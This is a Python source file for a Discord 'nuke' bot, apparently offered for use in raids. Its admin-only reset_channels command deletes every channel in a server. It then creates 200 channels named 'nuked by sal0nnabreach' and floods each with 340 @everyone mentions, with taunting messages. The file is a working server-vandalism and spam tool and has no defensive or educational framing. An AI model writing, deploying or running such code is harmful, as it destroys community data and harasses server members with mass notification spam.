import discord
from discord.ext import commands
import asyncio 

TOKEN = 'PUT YOUR TOKEN HERE'

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True  
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Bot {bot.user} is ready to nuke!')

async def create_channel_with_mentions(guild, role_everyone, admin_role):
    channel_name = "nuked by sal0nnabreach"

    overwrites = {
        role_everyone: discord.PermissionOverwrite(read_messages=True, send_messages=False), 
        admin_role: discord.PermissionOverwrite(read_messages=True, send_messages=True)  
    }

    channel = await guild.create_text_channel(name=channel_name, overwrites=overwrites)

    await channel.send(f"Got nuked kids @everyone")

    message_content = "@everyone " 
    for _ in range(340):
        await channel.send(message_content)

    print(f'Nuked succegully {channel_name}.')

@bot.command()
@commands.has_permissions(administrator=True) 
async def reset_channels(ctx):
    guild = ctx.guild

    await ctx.send("I'm nuking the server. This may take a while.")

    
    print("Start removing channels")
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f'Channel {channel.name} removed.')
        except Exception as e:
            print(f'Error at\'eliminating the channel {channel.name}: {e}')

    role_everyone = guild.default_role
    admin_role = discord.utils.get(guild.roles, permissions=discord.Permissions(administrator=True))

    tasks = []

    print("I'm nuking")
    for _ in range(200):  
        tasks.append(create_channel_with_mentions(guild, role_everyone, admin_role))

    
    await asyncio.gather(*tasks)

    await ctx.send("nuked succesfully")

bot.run(TOKEN)
